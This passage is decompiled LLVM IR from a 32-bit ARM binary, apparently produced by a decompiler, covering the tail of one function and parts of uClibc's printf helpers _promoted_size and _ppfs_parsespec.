  store i32 %v1_133fc, i32* %r3.global-to-local, align 4
  store i32 %v1_133fc, i32* %v2_13360, align 4
  %v0_13404 = load i32, i32* %ip.global-to-local, align 4
  %v1_13404 = inttoptr i32 %v0_13404 to i32*
  %v2_13404 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_13404, i32* %v1_13404, align 4
  %v3_13404 = add i32 %v0_13404, 4
  %v4_13404 = inttoptr i32 %v3_13404 to i32*
  %v5_13404 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_13404, i32* %v4_13404, align 4
  br label %dec_label_pc_1341c

dec_label_pc_1340c:                               ; preds = %dec_label_pc_13394, %dec_label_pc_13380, %dec_label_pc_13374, %dec_label_pc_133b4
  %v1_1340c = add i32 %v3_13360, 4
  store i32 %v1_1340c, i32* %r3.global-to-local, align 4
  store i32 %v1_1340c, i32* %v2_13360, align 4
  %v0_13414 = load i32, i32* %r1.global-to-local, align 4
  %v1_13414 = inttoptr i32 %v0_13414 to i32*
  %v2_13414 = load i32, i32* %v1_13414, align 4
  store i32 %v2_13414, i32* %r3.global-to-local, align 4
  %v1_13418 = load i32, i32* %ip.global-to-local, align 4
  %v2_13418 = inttoptr i32 %v1_13418 to i32*
  store i32 %v2_13414, i32* %v2_13418, align 4
  br label %dec_label_pc_1341c

dec_label_pc_1341c:                               ; preds = %dec_label_pc_133ec, %dec_label_pc_133d8, %dec_label_pc_133bc, %dec_label_pc_1340c
  %v0_1341c = load i32, i32* %ip.global-to-local, align 4
  %v1_1341c = add i32 %v0_1341c, 8
  store i32 %v1_1341c, i32* %ip.global-to-local, align 4
  %v0_13424.pre.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_13420.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_13420.backedge

dec_label_pc_13420.backedge:                      ; preds = %dec_label_pc_1341c, %dec_label_pc_1334c
  %v0_13420 = phi i32 [ %v0_13420.pre, %dec_label_pc_1341c ], [ %v0_1342024, %dec_label_pc_1334c ]
  %v0_13358.be = phi i32 [ %v0_13424.pre.pre, %dec_label_pc_1341c ], [ %v1_13358, %dec_label_pc_1334c ]
  %v1_13420 = add i32 %v0_13420, 28
  %v2_13420 = inttoptr i32 %v1_13420 to i32*
  %v3_13420 = load i32, i32* %v2_13420, align 4
  store i32 %v3_13420, i32* %r3.global-to-local, align 4
  %v5_13428 = icmp slt i32 %v0_13358.be, %v3_13420
  br i1 %v5_13428, label %dec_label_pc_1334c, label %dec_label_pc_13420.dec_label_pc_1342c.loopexit_crit_edge

dec_label_pc_13430:                               ; preds = %entry
  br i1 %v6_132f8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_13430
  %v2_13434 = add i32 %v0_132e4, 36
  %v3_13434 = inttoptr i32 %v2_13434 to i8*
  %v4_13434 = load i8, i8* %v3_13434, align 1
  %v5_13434 = zext i8 %v4_13434 to i32
  %v5_13438 = mul nuw nsw i32 %v5_13434, 8
  %v6_13438 = add i32 %v5_13438, %v0_132e4
  store i32 %v6_13438, i32* %r3.global-to-local, align 4
  %v2_1343c = add i32 %v6_13438, 72
  %v3_1343c = inttoptr i32 %v2_1343c to i32*
  %v4_1343c = load i32, i32* %v3_1343c, align 4
  store i32 %v4_1343c, i32* %r3.global-to-local, align 4
  store i32 %v4_1343c, i32* %v2_132f0, align 4
  %v0_13444.pre = load i32, i32* @r0, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_13430, %bb
  %v2_13458 = phi i32 [ %v0_13444.pre, %bb ], [ %v0_132e4, %dec_label_pc_13430 ]
  %v1_13444 = add i32 %v2_13458, 4
  %v2_13444 = inttoptr i32 %v1_13444 to i32*
  %v3_13444 = load i32, i32* %v2_13444, align 4
  store i32 %v3_13444, i32* %r3.global-to-local, align 4
  %v6_13448 = icmp eq i32 %v3_13444, -2147483648
  br i1 %v6_13448, label %bb16, label %dec_label_pc_1342c

bb16:                                             ; preds = %.thread1
  %v2_1344c = add i32 %v2_13458, 37
  %v3_1344c = inttoptr i32 %v2_1344c to i8*
  %v4_1344c = load i8, i8* %v3_1344c, align 1
  %v5_1344c = zext i8 %v4_1344c to i32
  %v5_13450 = mul nuw nsw i32 %v5_1344c, 8
  %v6_13450 = add i32 %v5_13450, %v2_13458
  store i32 %v6_13450, i32* %r3.global-to-local, align 4
  %v2_13454 = add i32 %v6_13450, 72
  %v3_13454 = inttoptr i32 %v2_13454 to i32*
  %v4_13454 = load i32, i32* %v3_13454, align 4
  store i32 %v4_13454, i32* %r3.global-to-local, align 4
  store i32 %v4_13454, i32* %v2_13444, align 4
  %v0_1345c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1342c

dec_label_pc_13420.dec_label_pc_1342c.loopexit_crit_edge: ; preds = %dec_label_pc_13420.backedge
  br label %dec_label_pc_1342c.loopexit

dec_label_pc_1342c.loopexit:                      ; preds = %dec_label_pc_13420.dec_label_pc_1342c.loopexit_crit_edge, %dec_label_pc_13340
  %v0_13420.lcssa = phi i32 [ %v0_13420, %dec_label_pc_13420.dec_label_pc_1342c.loopexit_crit_edge ], [ %v0_1342017, %dec_label_pc_13340 ]
  br label %dec_label_pc_1342c

dec_label_pc_1342c:                               ; preds = %dec_label_pc_1342c.loopexit, %.thread1, %bb16
  %v1_1347c = phi i32 [ %v0_13420.lcssa, %dec_label_pc_1342c.loopexit ], [ %v2_13458, %.thread1 ], [ %v0_1345c.pre, %bb16 ]
  %v1_1345c = add i32 %v1_1347c, 8
  %v2_1345c = inttoptr i32 %v1_1345c to i32*
  %v3_1345c = load i32, i32* %v2_1345c, align 4
  store i32 %v3_1345c, i32* %r1.global-to-local, align 4
  %v1_13460 = icmp slt i32 %v3_1345c, 0
  br i1 %v1_13460, label %dec_label_pc_13468, label %dec_label_pc_13488

dec_label_pc_13468:                               ; preds = %dec_label_pc_1342c
  %v1_13468 = add i32 %v1_1347c, 16
  %v2_13468 = inttoptr i32 %v1_13468 to i32*
  %v3_13468 = load i32, i32* %v2_13468, align 4
  %v1_13470 = sub i32 0, %v3_1345c
  store i32 %v1_13470, i32* %r1.global-to-local, align 4
  %v1_1346c = and i32 %v3_13468, -10
  %v1_13474 = or i32 %v1_1346c, 8
  store i32 %v1_13474, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_1347c = add i32 %v1_1347c, 20
  %v3_1347c = inttoptr i32 %v2_1347c to i32*
  store i32 32, i32* %v3_1347c, align 4
  %v0_13480 = load i32, i32* %r1.global-to-local, align 4
  %v1_13480 = load i32, i32* @r0, align 4
  %v2_13480 = add i32 %v1_13480, 8
  %v3_13480 = inttoptr i32 %v2_13480 to i32*
  store i32 %v0_13480, i32* %v3_13480, align 4
  %v0_13484 = load i32, i32* %r3.global-to-local, align 4
  %v1_13484 = load i32, i32* @r0, align 4
  %v2_13484 = add i32 %v1_13484, 16
  %v3_13484 = inttoptr i32 %v2_13484 to i32*
  store i32 %v0_13484, i32* %v3_13484, align 4
  %v1_1348c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_13488

dec_label_pc_13488:                               ; preds = %dec_label_pc_1342c, %dec_label_pc_13468
  %v1_1348c = phi i32 [ %v1_1347c, %dec_label_pc_1342c ], [ %v1_1348c.pre, %dec_label_pc_13468 ]
  %v2_13488 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13488, i32* @r4, align 4
  ret i32 %v1_1348c

; uselistorder directives
  uselistorder i32 %v2_13458, { 1, 0, 2, 3 }
  uselistorder i32 %v0_13358.be, { 1, 0 }
  uselistorder i32 %v0_13420, { 1, 2, 0 }
  uselistorder i32 %v3_13360, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_13360, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_13350, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v0_1335823, { 1, 0 }
  uselistorder i32 %v0_1342024, { 0, 2, 1 }
  uselistorder i32 %v0_1342017, { 2, 0, 1 }
  uselistorder i32 %v0_132e4, { 1, 0, 4, 2, 3, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 16, 7, 8, 9, 10, 11, 12, 13, 14, 15, 23, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 7, 3, 4, 5, 6, 8, 9, 10 }
  uselistorder label %dec_label_pc_13488, { 1, 0 }
  uselistorder label %dec_label_pc_1342c, { 0, 2, 1 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_1341c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1340c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_133ec, { 1, 0 }
  uselistorder label %dec_label_pc_133d8, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_1334c, { 1, 0 }
  uselistorder label %dec_label_pc_13340, { 1, 0 }
  uselistorder label %dec_label_pc_13318, { 1, 0 }
}

define i32 @_promoted_size() local_unnamed_addr {
entry:
  %v1_134b0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_134ac

dec_label_pc_134ac:                               ; preds = %dec_label_pc_134b8, %entry
  %v0_134ac = phi i32 [ %v1_134ac, %dec_label_pc_134b8 ], [ add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -5326), %entry ]
  %v1_134ac = add i32 %v0_134ac, -2
  %v2_134ac = inttoptr i32 %v1_134ac to i16*
  %v3_134ac = load i16, i16* %v2_134ac, align 2
  %v4_134ac = sext i16 %v3_134ac to i32
  store i32 %v1_134ac, i32* @ip, align 4
  %v9_134b0 = icmp eq i32 %v4_134ac, %v1_134b0.pre
  br i1 %v9_134b0, label %dec_label_pc_134ac.dec_label_pc_134c0_crit_edge, label %dec_label_pc_134b8

dec_label_pc_134ac.dec_label_pc_134c0_crit_edge:  ; preds = %dec_label_pc_134ac
  br label %dec_label_pc_134c0

dec_label_pc_134b8:                               ; preds = %dec_label_pc_134ac
  %tmp = icmp ugt i32 %v1_134ac, add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -5350)
  br i1 %tmp, label %dec_label_pc_134ac, label %dec_label_pc_134c0.loopexit

dec_label_pc_134c0.loopexit:                      ; preds = %dec_label_pc_134b8
  br label %dec_label_pc_134c0

dec_label_pc_134c0:                               ; preds = %dec_label_pc_134c0.loopexit, %dec_label_pc_134ac.dec_label_pc_134c0_crit_edge
  %v2_134d0.pre-phi = sub i32 %v1_134ac, add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -5350)
  store i32 %v2_134d0.pre-phi, i32* @r2, align 4
  %v4_134d4 = sdiv i32 %v2_134d0.pre-phi, 2
  %v5_134d4 = add i32 %v4_134d4, add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -5326)
  %v6_134d4 = inttoptr i32 %v5_134d4 to i8*
  %v7_134d4 = load i8, i8* %v6_134d4, align 1
  %v9_134d4 = zext i8 %v7_134d4 to i32
  ret i32 %v9_134d4

; uselistorder directives
  uselistorder i32 %v2_134d0.pre-phi, { 1, 0 }
  uselistorder i32 %v1_134ac, { 1, 0, 3, 4, 2 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -5350), { 1, 0 }
}

define i32 @_ppfs_parsespec(i8* %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp117 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-111 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-120 = alloca i8*, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_134e8 = load i32, i32* @r4, align 4
  store i32 %v3_134e8, i32* %stack_var_-36, align 4
  %v6_134e8 = load i32, i32* @r5, align 4
  %v27_134e8 = load i32, i32* @lr, align 4
  %v0_134ec = load i32, i32* %r0.global-to-local, align 4
  %v1_134ec = add i32 %v0_134ec, 16
  %v2_134ec = inttoptr i32 %v1_134ec to i32*
  %v3_134ec = load i32, i32* %v2_134ec, align 4
  %v1_134f4 = and i32 %v3_134ec, 128
  store i32 %v1_134f4, i32* @r4, align 4
  %v2_134f4 = icmp eq i32 %v1_134f4, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %v0_134ec, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* @lr, align 4
  %v1_1351c = add i32 %v0_134ec, 24
  %v2_1351c = inttoptr i32 %v1_1351c to i32*
  %v3_1351c = load i32, i32* %v2_1351c, align 4
  store i32 %v3_1351c, i32* %fp.global-to-local, align 4
  br i1 %v2_134f4, label %.dec_label_pc_13570_crit_edge, label %dec_label_pc_13528

.dec_label_pc_13570_crit_edge:                    ; preds = %entry
  %v2_13520 = inttoptr i32 %v0_134ec to i32*
  %v3_13520 = load i32, i32* %v2_13520, align 4
  store i32 %v3_13520, i32* %r0.global-to-local, align 4
  %.pre = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_13570

dec_label_pc_13528:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_13538 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_1352c

dec_label_pc_1352c:                               ; preds = %dec_label_pc_1355c.dec_label_pc_1352c_crit_edge, %dec_label_pc_13528
  %v1_1353c = phi i32 [ %v1_1354c, %dec_label_pc_1355c.dec_label_pc_1352c_crit_edge ], [ 0, %dec_label_pc_13528 ]
  %v0_1352c = phi i32 [ %v0_1352c.pre, %dec_label_pc_1355c.dec_label_pc_1352c_crit_edge ], [ %v0_134ec, %dec_label_pc_13528 ]
  %v1_1352c = inttoptr i32 %v0_1352c to i32*
  %v2_1352c = load i32, i32* %v1_1352c, align 4
  %v4_13530 = mul i32 %v1_1353c, 4
  %v5_13530 = add i32 %v2_1352c, %v4_13530
  store i32 %v5_13530, i32* %r3.global-to-local, align 4
  %v1_13534 = add i32 %v5_13530, -4
  %v2_13534 = inttoptr i32 %v1_13534 to i8*
  %v3_13534 = load i8, i8* %v2_13534, align 1
  %v4_13534 = zext i8 %v3_13534 to i32
  store i32 %v4_13534, i32* %r1.global-to-local, align 4
  store i32 %v2_13538, i32* @ip, align 4
  %v2_1353c = add i32 %v1_1353c, %v2_13538
  store i32 %v2_1353c, i32* %r2.global-to-local, align 4
  %v3_13540 = add i32 %v2_1353c, -72
  %v4_13540 = inttoptr i32 %v3_13540 to i8*
  store i8 %v3_13534, i8* %v4_13540, align 1
  %v0_13544 = load i32, i32* %r3.global-to-local, align 4
  %v1_13544 = add i32 %v0_13544, -4
  %v2_13544 = inttoptr i32 %v1_13544 to i32*
  %v3_13544 = load i32, i32* %v2_13544, align 4
  store i32 %v3_13544, i32* %r3.global-to-local, align 4
  %v0_13548 = load i32, i32* %r1.global-to-local, align 4
  %v9_13548 = icmp eq i32 %v0_13548, %v3_13544
  %v0_1354c = load i32, i32* %r0.global-to-local, align 4
  %v1_1354c = add i32 %v0_1354c, 1
  store i32 %v1_1354c, i32* %r0.global-to-local, align 4
  br i1 %v9_13548, label %dec_label_pc_13554, label %dec_label_pc_13a18

dec_label_pc_13554:                               ; preds = %dec_label_pc_1352c
  %v2_13554 = icmp eq i32 %v3_13544, 0
  br i1 %v2_13554, label %dec_label_pc_13564, label %dec_label_pc_1355c

dec_label_pc_1355c:                               ; preds = %dec_label_pc_13554
  %tmp182 = icmp ult i32 %v1_1354c, 32
  br i1 %tmp182, label %dec_label_pc_1355c.dec_label_pc_1352c_crit_edge, label %dec_label_pc_13564

dec_label_pc_1355c.dec_label_pc_1352c_crit_edge:  ; preds = %dec_label_pc_1355c
  %v0_1352c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1352c

dec_label_pc_13564:                               ; preds = %dec_label_pc_1355c, %dec_label_pc_13554
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_1356c = ptrtoint i32* %stack_var_-111 to i32
  store i32 %v2_1356c, i32* %r0.global-to-local, align 4
  %v0_1357c.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_13570

dec_label_pc_13570:                               ; preds = %.dec_label_pc_13570_crit_edge, %dec_label_pc_13564
  %v3_135a4.pre-phi = phi i32 [ %.pre, %.dec_label_pc_13570_crit_edge ], [ %v2_13538, %dec_label_pc_13564 ]
  %v0_1359c64 = phi i32 [ %v3_13520, %.dec_label_pc_13570_crit_edge ], [ %v2_1356c, %dec_label_pc_13564 ]
  %v0_1357c = phi i32 [ ptrtoint (i32* @global_var_28010.981 to i32), %.dec_label_pc_13570_crit_edge ], [ %v0_1357c.pre, %dec_label_pc_13564 ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 744, i32* %r2.global-to-local, align 4
  %v2_1357c = add i32 %v0_1357c, -5288
  store i32 %v2_1357c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 -4, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  %v4_13590 = inttoptr i32 %v2_1357c to i8*
  store i8* %v4_13590, i8** %stack_var_-120, align 4
  br label %dec_label_pc_1359c

dec_label_pc_13598:                               ; preds = %.thread20, %dec_label_pc_136cc
  %v0_13598 = phi i32 [ %v2_13744, %.thread20 ], [ %v0_136a876, %dec_label_pc_136cc ]
  %stack_var_-44.0 = phi i32 [ %stack_var_-44.3, %.thread20 ], [ %stack_var_-44.2, %dec_label_pc_136cc ]
  store i32 %v0_13598, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1359c

dec_label_pc_1359c:                               ; preds = %dec_label_pc_13570, %dec_label_pc_13598
  %v1_135b0 = phi i32 [ %v0_1359c64, %dec_label_pc_13570 ], [ %v0_13598, %dec_label_pc_13598 ]
  %stack_var_-44.1 = phi i32 [ %tmp117, %dec_label_pc_13570 ], [ %stack_var_-44.0, %dec_label_pc_13598 ]
  %v1_1359c = inttoptr i32 %v1_135b0 to i8*
  %v2_1359c = load i8, i8* %v1_1359c, align 1
  %v3_1359c = zext i8 %v2_1359c to i32
  store i32 %v3_1359c, i32* %r3.global-to-local, align 4
  %v7_135a0 = icmp eq i8 %v2_1359c, 42
  br i1 %v7_135a0, label %bb, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1359c
  store i32 %v1_135b0, i32* %r6.global-to-local, align 4
  %v0_135b4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_135b4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_135fc.preheader

bb:                                               ; preds = %dec_label_pc_1359c
  %v1_135a8 = load i32, i32* %r8.global-to-local, align 4
  %v2_135a8 = load i32, i32* %sb.global-to-local, align 4
  %v4_135a8 = mul i32 %v2_135a8, %v1_135a8
  %v5_135a8 = add i32 %v4_135a8, %v3_135a4.pre-phi
  store i32 %v5_135a8, i32* %r3.global-to-local, align 4
  %v2_135b0 = add i32 %v1_135b0, 1
  store i32 %v2_135b0, i32* %r6.global-to-local, align 4
  %v0_135b4111 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_135b4111, i32* %r1.global-to-local, align 4
  %v3_135b8 = add i32 %v5_135a8, -40
  %v4_135b8 = inttoptr i32 %v3_135b8 to i32*
  store i32 %v0_135b4111, i32* %v4_135b8, align 4
  %v0_13600.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_135fc.preheader

dec_label_pc_135fc.preheader:                     ; preds = %.thread8, %bb
  %v0_13600.pre = phi i32 [ %v1_135b0, %.thread8 ], [ %v0_13600.pre.pre, %bb ]
  %v0_13604.pre = load i32, i32* @lr, align 4
  %v2_13604 = add i32 %v0_13604.pre, 744
  %v3_13604 = inttoptr i32 %v2_13604 to i32*
  br label %dec_label_pc_135fc

dec_label_pc_135c0:                               ; preds = %dec_label_pc_135fc
  store i32 214748363, i32* %r3.global-to-local, align 4
  %v0_135c4 = load i32, i32* %r1.global-to-local, align 4
  %v2_135c4 = add i32 %v0_135c4, -214748363
  %tmp139 = sub i32 214748362, %v0_135c4
  %v6_135c4 = and i32 %tmp139, %v0_135c4
  %v7_135c4 = icmp slt i32 %v6_135c4, 0
  %v8_135c4 = icmp slt i32 %v2_135c4, 0
  %v9_135c4 = icmp eq i32 %v0_135c4, 214748363
  %v3_135c8 = xor i1 %v8_135c4, %v7_135c4
  %v4_135c8 = or i1 %v9_135c4, %v3_135c8
  br i1 %v4_135c8, label %dec_label_pc_135e0, label %dec_label_pc_135cc

dec_label_pc_135cc:                               ; preds = %dec_label_pc_135c0
  store i32 214748364, i32* %r2.global-to-local, align 4
  %v9_135d0 = icmp eq i32 %v0_135c4, 214748364
  br i1 %v9_135d0, label %dec_label_pc_135d8, label %dec_label_pc_135f8

dec_label_pc_135d8:                               ; preds = %dec_label_pc_135cc
  %v8_135dc = icmp ugt i8 %v2_13600, 55
  br i1 %v8_135dc, label %dec_label_pc_135f8, label %dec_label_pc_135e0

dec_label_pc_135e0:                               ; preds = %dec_label_pc_135d8, %dec_label_pc_135c0
  %v2_135e4 = mul i32 %v0_135c4, 10
  %v1_135e8 = add i32 %v2_135e4, -48
  store i32 %v1_135e8, i32* %r3.global-to-local, align 4
  %v2_135ec = add i32 %v1_135e8, %v3_13600
  br label %dec_label_pc_135f8

dec_label_pc_135f8:                               ; preds = %dec_label_pc_135d8, %dec_label_pc_135cc, %dec_label_pc_135e0
  %storemerge = phi i32 [ %v2_135ec, %dec_label_pc_135e0 ], [ 2147483647, %dec_label_pc_135cc ], [ 2147483647, %dec_label_pc_135d8 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_135f8 = add i32 %v0_13680, 1
  store i32 %v1_135f8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_135fc

dec_label_pc_135fc:                               ; preds = %dec_label_pc_135fc.preheader, %dec_label_pc_135f8
  %v0_13680 = phi i32 [ %v0_13600.pre, %dec_label_pc_135fc.preheader ], [ %v1_135f8, %dec_label_pc_135f8 ]
  store i32 744, i32* %r2.global-to-local, align 4
  %v1_13600 = inttoptr i32 %v0_13680 to i8*
  %v2_13600 = load i8, i8* %v1_13600, align 1
  %v3_13600 = zext i8 %v2_13600 to i32
  store i32 %v3_13600, i32* @ip, align 4
  %v4_13604 = load i32, i32* %v3_13604, align 4
  store i32 %v4_13604, i32* %r3.global-to-local, align 4
  %v2_13608 = mul nuw nsw i32 %v3_13600, 2
  store i32 %v2_13608, i32* %r2.global-to-local, align 4
  %v2_1360c = add i32 %v2_13608, %v4_13604
  %v3_1360c = inttoptr i32 %v2_1360c to i16*
  %v4_1360c = load i16, i16* %v3_1360c, align 2
  %v6_1360c = zext i16 %v4_1360c to i32
  store i32 %v6_1360c, i32* %r3.global-to-local, align 4
  %v1_13610 = and i32 %v6_1360c, 8
  %v2_13610 = icmp eq i32 %v1_13610, 0
  br i1 %v2_13610, label %dec_label_pc_13618, label %dec_label_pc_135c0

dec_label_pc_13618:                               ; preds = %dec_label_pc_135fc
  %v0_13618 = load i32, i32* %r0.global-to-local, align 4
  %v1_13618 = add i32 %v0_13618, -1
  %v2_13618 = inttoptr i32 %v1_13618 to i8*
  %v3_13618 = load i8, i8* %v2_13618, align 1
  %v4_13618 = zext i8 %v3_13618 to i32
  store i32 %v4_13618, i32* %r3.global-to-local, align 4
  %v7_1361c = icmp eq i8 %v3_13618, 37
  br i1 %v7_1361c, label %dec_label_pc_13624, label %dec_label_pc_136e4

dec_label_pc_13624:                               ; preds = %dec_label_pc_13618
  %v7_13624 = icmp eq i8 %v2_13600, 36
  %. = zext i1 %v7_13624 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_13630 = load i32, i32* %r1.global-to-local, align 4
  %tmp143 = icmp slt i32 %v0_13630, 1
  br i1 %tmp143, label %bb144, label %thread-pre-split

bb144:                                            ; preds = %dec_label_pc_13624
  store i32 0, i32* %r3.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_13624, %bb144
  %v0_13638 = phi i32 [ 0, %bb144 ], [ %., %dec_label_pc_13624 ]
  %v2_13638 = icmp eq i32 %v0_13638, 0
  %v0_1366c = load i32, i32* %fp.global-to-local, align 4
  br i1 %v2_13638, label %dec_label_pc_1366c, label %dec_label_pc_13640

dec_label_pc_13640:                               ; preds = %thread-pre-split
  %v2_1366c = icmp eq i32 %v0_1366c, 0
  %v1_13644 = add i32 %v0_13680, 1
  store i32 %v1_13644, i32* %r0.global-to-local, align 4
  br i1 %v2_1366c, label %dec_label_pc_13a18, label %dec_label_pc_1364c

dec_label_pc_1364c:                               ; preds = %dec_label_pc_13640
  %v2_1364c = sub i32 %v0_13630, %v0_1366c
  %v4_1364c = xor i32 %v0_1366c, %v0_13630
  %v5_1364c = xor i32 %v2_1364c, %v0_13630
  %v6_1364c = and i32 %v5_1364c, %v4_1364c
  %v7_1364c = icmp slt i32 %v6_1364c, 0
  %v8_1364c = icmp slt i32 %v2_1364c, 0
  %v9_1364c = icmp eq i32 %v0_13630, %v0_1366c
  %v3_13650 = xor i1 %v8_1364c, %v7_1364c
  %v4_13650 = or i1 %v9_1364c, %v3_13650
  br i1 %v4_13650, label %dec_label_pc_13660, label %bb145

bb145:                                            ; preds = %dec_label_pc_1364c
  store i32 %v0_13630, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_13660

dec_label_pc_1365c:                               ; preds = %dec_label_pc_13680, %dec_label_pc_13688
  %v0_1365c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1365c, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_13660

dec_label_pc_13660:                               ; preds = %bb145, %dec_label_pc_1364c, %dec_label_pc_1365c
  %v0_13660 = phi i32 [ %v0_13618, %dec_label_pc_1365c ], [ %v1_13644, %dec_label_pc_1364c ], [ %v1_13644, %bb145 ]
  %stack_var_-44.2 = phi i32 [ %stack_var_-44.1, %dec_label_pc_1365c ], [ %v0_13630, %dec_label_pc_1364c ], [ %v0_13630, %bb145 ]
  store i32 %v0_13660, i32* %r6.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  %v2_1369c.pre = load i8*, i8** %stack_var_-120, align 4
  %v3_1369c = ptrtoint i8* %v2_1369c.pre to i32
  br label %dec_label_pc_1369c

dec_label_pc_1366c:                               ; preds = %thread-pre-split
  %tmp146 = icmp slt i32 %v0_1366c, 1
  br i1 %tmp146, label %dec_label_pc_13680, label %dec_label_pc_13674

dec_label_pc_13674:                               ; preds = %dec_label_pc_1366c
  %v7_13674 = icmp eq i8 %v2_13600, 109
  br i1 %v7_13674, label %dec_label_pc_136e4, label %dec_label_pc_13a18

dec_label_pc_13680:                               ; preds = %dec_label_pc_1366c
  %tmp183 = icmp ugt i32 %v0_13680, %v0_13618
  br i1 %tmp183, label %dec_label_pc_13688, label %dec_label_pc_1365c

dec_label_pc_13688:                               ; preds = %dec_label_pc_13680
  %v1_13688 = inttoptr i32 %v0_13618 to i8*
  %v2_13688 = load i8, i8* %v1_13688, align 1
  %v3_13688 = zext i8 %v2_13688 to i32
  store i32 %v3_13688, i32* %r3.global-to-local, align 4
  %v7_1368c = icmp eq i8 %v2_13688, 48
  br i1 %v7_1368c, label %dec_label_pc_1365c, label %bb147

bb147:                                            ; preds = %dec_label_pc_13688
  %v1_13690 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_13690, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_136e4

dec_label_pc_1369c.loopexit:                      ; preds = %dec_label_pc_136a4
  %v1_136b0 = load i32, i32* @r4, align 4
  %v3_136b0 = or i32 %v1_136b0, %v0_136c4
  store i32 %v3_136b0, i32* @r4, align 4
  %v2_136b4 = add i32 %v0_136a876, 1
  store i32 %v2_136b4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1369c

dec_label_pc_1369c:                               ; preds = %dec_label_pc_1369c.loopexit, %dec_label_pc_13660
  %v0_136a876 = phi i32 [ %v2_136b4, %dec_label_pc_1369c.loopexit ], [ %v0_13660, %dec_label_pc_13660 ]
  store i32 %v3_1369c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_136a8 = inttoptr i32 %v0_136a876 to i8*
  br label %dec_label_pc_136a4

dec_label_pc_136a4:                               ; preds = %dec_label_pc_136bc, %dec_label_pc_1369c
  %v0_136c4 = phi i32 [ %v2_136c4, %dec_label_pc_136bc ], [ 1, %dec_label_pc_1369c ]
  %v0_136a4 = phi i32 [ %v5_136a4, %dec_label_pc_136bc ], [ %v3_1369c, %dec_label_pc_1369c ]
  %v1_136a4 = inttoptr i32 %v0_136a4 to i8*
  %v2_136a4 = load i8, i8* %v1_136a4, align 1
  %v3_136a4 = zext i8 %v2_136a4 to i32
  store i32 %v3_136a4, i32* %r2.global-to-local, align 4
  %v5_136a4 = add i32 %v0_136a4, 1
  store i32 %v5_136a4, i32* %r0.global-to-local, align 4
  %v2_136a8 = load i8, i8* %v1_136a8, align 1
  %v3_136a8 = zext i8 %v2_136a8 to i32
  store i32 %v3_136a8, i32* %r3.global-to-local, align 4
